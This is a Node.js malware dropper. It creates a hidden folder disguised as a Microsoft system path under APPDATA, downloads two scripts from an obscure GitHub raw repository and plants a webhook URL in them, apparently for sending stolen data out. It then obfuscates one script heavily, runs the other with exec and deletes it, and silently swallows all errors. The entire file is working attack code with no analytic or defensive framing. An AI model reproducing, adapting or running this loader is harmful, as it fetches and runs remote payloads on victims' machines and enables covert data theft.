const fs = require("fs");
const https = require("https");
const path = require("path");
const os = require("os");
const { exec } = require("child_process");
const JavaScriptObfuscator = require("javascript-obfuscator");

const H00K3_URL = "%WEBHOOK%";

const appData = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
const prepparedPath = path.join(appData, "Microsoft", "Net", "System", "My", "CTLs");
fs.mkdirSync(prepparedPath, { recursive: true });

const scriptsToDownload = [
  {
    url: "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/imports.js",
    fileName: "imports.js"
  },
  {
    url: "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/4i5tyydshnyi.js",
    fileName: "index.js"
  }
];

function tryDownload(url) {
  return new Promise((resolve) => {
    https.get(url, (res) => {
      let data = "";
      res.on("data", chunk => data += chunk);
      res.on("end", () => resolve(data));
    }).on("error", () => resolve(null));
  });
}

function generateRandomName() {
  return Math.random().toString(36).substring(2, 12) + ".js";
}

async function downloadFiles() {
  for (const script of scriptsToDownload) {
    try {
      const contentRaw = await tryDownload(script.url);
      if (!contentRaw) continue;

      let content = contentRaw.split('\n').map(line => {
        if (line.includes('H00K3_URL = "%WEBHOOK%"')) {
          return line.replace('%WEBHOOK%', H00K3_URL);
        }
        return line;
      }).join('\n');

      const name = script.fileName || generateRandomName();
      const filePath = path.join(prepparedPath, name);

      if (name.toLowerCase() !== "imports.js") {
        const obfuscated = JavaScriptObfuscator.obfuscate(content, {
          compact: true,
          controlFlowFlattening: true,
          controlFlowFlatteningThreshold: 1,
          deadCodeInjection: true,
          deadCodeInjectionThreshold: 1,
          debugProtection: true,
          disableConsoleOutput: true,
          rotateStringArray: true,
          selfDefending: true,
          stringArray: true,
          stringArrayEncoding: ["rc4"],
          stringArrayThreshold: 1,
          transformObjectKeys: true,
          unicodeEscapeSequence: true
        });
        content = obfuscated.getObfuscatedCode();
      }

      fs.writeFileSync(filePath, content, "utf8");

      if (name.toLowerCase() === "imports.js") {
        exec(`node "${filePath}"`, () => {
          fs.unlinkSync(filePath);
        });
      }

    } catch (_) {

    }
  }
}

downloadFiles();
